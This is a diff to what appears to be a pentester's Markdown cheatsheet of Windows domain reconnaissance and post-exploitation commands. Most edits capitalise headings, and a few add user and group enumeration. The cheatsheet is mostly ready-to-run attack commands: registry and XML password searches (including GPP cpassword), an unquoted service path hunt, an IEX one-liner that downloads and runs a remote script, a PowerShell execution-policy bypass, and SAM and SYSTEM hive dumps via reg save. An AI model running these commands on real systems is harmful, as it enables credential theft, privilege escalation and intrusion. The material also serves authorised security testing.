@@ -1,22 +1,22 @@
 # This cheatsheet is for recon of a windows environnement starting with a simple computer member of the domain.
 
-## get iP configuration
+## Get iP configuration
 ipconfig /all 
 
-## check existing route
+## Check existing route
 
 route print
 
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 
-## check local firewall state
+## Check local firewall state
 
 netsh firewall show state
 
 Get-NetFirewallProfile
 
 
-##check Arp Cache 
+## Check Arp Cache 
 
 arp -a
 
@@ -27,7 +27,7 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,Stat
 
 whoami /all
 
-## get information about the system
+## Get information about the system
 
 systeminfo
 
@@ -41,28 +41,35 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 get-content C:\WINDOWS\System32\drivers\etc\hosts
 
-## check privilege 
+## Check privilege 
 
 whoami /priv
 
-## get all local user
+## Get all local user
 
 net user
 
 Get-LocalUser | ft Name,Enabled,LastLogon
 
-## get all local group
+## Get intel for a specific local user 
+
+net user administrator
+Get-LocalUser administrator | fl *
+
+## Get all local group
 
 net localgroup
 
 Get-LocalGroup | ft Name
 
 
-## check member of local group
+## Check member of local group
 
 net localgroup administrateurs
 
-## get member of domain admin groups
+Get-LocalGroupMember "administrateurs"
+
+## Get member of domain admin groups
 
 net group /domain "admins du domaine"
 
@@ -172,7 +179,8 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 ## List Unquoted service Path
 
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
-## check password in regigistre
+
+## Check password in regigistre
 reg query HKCU /f password /t REG_SZ /s
 reg query HKLM /f password /t REG_SZ /s 
 
@@ -180,7 +188,7 @@ reg query HKLM /f password /t REG_SZ /s
 
 IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
 
-## powershell bypass execution policy
+## Powershell bypass execution policy
 
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
@@ -203,11 +211,11 @@ findstr /si cpassword *.xml
 ## List VSS
 vssadmin list shadows
 
-## dump sam 
+## Dump sam 
 
 reg save hklm\sam sam.hiv
 reg save hklm\system sys.hiv
-## some other interessing files
+## Some other interessing files
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
 c:\unattend.xml
